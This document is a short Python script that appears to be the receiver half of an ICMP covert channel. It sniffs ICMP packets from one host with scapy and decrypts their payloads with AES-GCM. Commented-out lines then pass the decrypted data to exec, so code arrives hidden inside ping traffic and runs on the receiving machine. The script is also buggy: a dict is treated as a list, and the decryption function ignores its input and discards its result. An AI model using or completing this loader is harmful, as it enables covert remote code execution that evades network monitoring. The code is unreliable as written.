from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from scapy.all import *

fil = "src host 10.0.0.113 and icmp"
data_received = {}
complete_payload = ""

with open("aes_key.bin", "rb") as key_file:
    symkey = key_file.read()


def handle_data_received(packet):
    # data_received.append(packet[Raw].load.decode("unicode_escape"))
    packet_data = packet[Raw].load
    decrypted_data = decrypt_chunk(packet_data)

    data_received.append(packet[Raw].load)


def decrypt_chunk(chunk: bytes) -> bytes:
    aesgcm = AESGCM(symkey)
    # extract nonce and ciphertext
    cipehertext = b"".join(data_received)
    nonce = cipehertext[:12]
    enc_text = cipehertext[12:]

    print(cipehertext)
    # decrypt
    decrypted = aesgcm.decrypt(nonce, enc_text, associated_data=None)
    return decrypted


sniffed = sniff(filter=fil, prn=handle_data_received, count=3)

# decrypted = decrypt_chunk(data_received[0])
# exec(decrypted.decode())

# exec("".join(data_received))
